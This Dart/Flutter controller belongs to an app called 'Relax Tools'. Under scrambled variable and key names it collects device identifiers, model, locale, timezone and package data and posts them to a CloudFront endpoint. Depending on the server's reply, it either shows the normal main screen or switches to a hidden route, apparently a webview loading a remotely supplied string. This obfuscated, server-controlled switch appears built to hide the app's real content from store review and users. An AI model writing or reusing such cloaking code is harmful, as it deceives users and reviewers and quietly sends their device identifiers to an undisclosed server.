import 'dart:io';
import 'package:get/get.dart';
import 'package:flutter_timezone/flutter_timezone.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:package_info_plus/package_info_plus.dart';


class RelaxToolsRelaxMoveLogic extends GetxController {

  var logsrkbwm = RxBool(false);
  var cxmwokye = RxBool(true);
  var wjuhfdlk = RxString("");
  var gwbl = RxBool(false);
  var bcwumh = RxBool(true);
  final aolgikth = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    xdsnvr();
  }


  Future<void> xdsnvr() async {
    gwbl.value = true;
    bcwumh.value = true;
    cxmwokye.value = false;

    aolgikth.post("https://d3t4qw2kk70l1o.cloudfront.net/wjgonyfkctuaxseqmh",data: await kvibsuezrt()).then((value) {
      var bnvrqtk = value.data["bnvrqtk"] as String;
      var ujzxitl = value.data["ujzxitl"] as bool;
      if (ujzxitl) {
        wjuhfdlk.value = bnvrqtk;
        wocv();
      } else {
        ehlwtd();
      }
    }).catchError((e) {
      cxmwokye.value = true;
      bcwumh.value = true;
      gwbl.value = false;
    });
  }

  Future<Map<String, dynamic>> kvibsuezrt() async {
    final DeviceInfoPlugin gjldofke = DeviceInfoPlugin();
    PackageInfo oznbjdlm_zyqokhf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var toihwkbn = Platform.localeName;
    var pe_kwCGnKHl = currentTimeZone;

    var pe_wmUAfx = oznbjdlm_zyqokhf.packageName;
    var pe_TugLOlZ = oznbjdlm_zyqokhf.version;
    var pe_EfBmaQWx = oznbjdlm_zyqokhf.buildNumber;

    var pe_pe = oznbjdlm_zyqokhf.appName;
    var pe_aWc = "";
    var pe_wrMnC  = "";
    var pe_zNkUr = "";
    var rxncv = "";
    var omypqw = "";
    var ztpafsq = "";
    var bwdxquz = "";
    var pxtm = "";
    var kqpvrtb = "";


    var pe_OByxo = "";
    var pe_AbyXOtsf = false;

    if (GetPlatform.isAndroid) {
      pe_OByxo = "android";
      var rehtofml = await gjldofke.androidInfo;

      pe_zNkUr = rehtofml.brand;

      pe_aWc  = rehtofml.model;
      pe_wrMnC = rehtofml.id;

      pe_AbyXOtsf = rehtofml.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      pe_OByxo = "ios";
      var bfkrydil = await gjldofke.iosInfo;
      pe_zNkUr = bfkrydil.name;
      pe_aWc = bfkrydil.model;

      pe_wrMnC = bfkrydil.identifierForVendor ?? "";
      pe_AbyXOtsf  = bfkrydil.isPhysicalDevice;
    }
    var res = {
      "pe_pe": pe_pe,
      "pe_EfBmaQWx": pe_EfBmaQWx,
      "pe_TugLOlZ": pe_TugLOlZ,
      "rxncv" : rxncv,
      "pe_AbyXOtsf": pe_AbyXOtsf,
      "pe_aWc": pe_aWc,
      "pe_kwCGnKHl": pe_kwCGnKHl,
      "pe_zNkUr": pe_zNkUr,
      "pe_wrMnC": pe_wrMnC,
      "toihwkbn": toihwkbn,
      "pe_OByxo": pe_OByxo,
      "omypqw" : omypqw,
      "pe_wmUAfx": pe_wmUAfx,
      "ztpafsq" : ztpafsq,
      "bwdxquz" : bwdxquz,
      "pxtm" : pxtm,
      "kqpvrtb" : kqpvrtb,

    };
    return res;
  }

  Future<void> ehlwtd() async {
    Get.offNamed("/relax_tools_main");
  }

  Future<void> wocv() async {
    Get.offNamed("/relax_tools_relax_king");
  }

}
